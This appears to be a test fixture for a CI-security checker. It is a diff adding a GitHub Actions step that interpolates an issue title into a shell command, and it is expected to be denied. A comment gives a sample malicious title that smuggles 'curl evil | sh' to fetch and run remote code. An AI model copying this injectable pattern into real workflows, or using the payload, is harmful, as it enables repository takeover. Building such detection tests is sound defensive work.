@@ -1,0 +1,14 @@
+# expect: deny
+# rules: diff-ci-injection
+# An issue's title expanded into a script: a title of `"; curl evil | sh; "` runs.
+diff --git a/.github/workflows/triage.yml b/.github/workflows/triage.yml
+index 1111111..2222222 100644
+--- a/.github/workflows/triage.yml
++++ b/.github/workflows/triage.yml
+@@ -10,4 +10,6 @@ jobs:
+     steps:
+       - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+         with:
+           persist-credentials: false
++      - name: label
++        run: echo "New issue: ${{ github.event.issue.title }}" >> "$GITHUB_STEP_SUMMARY"
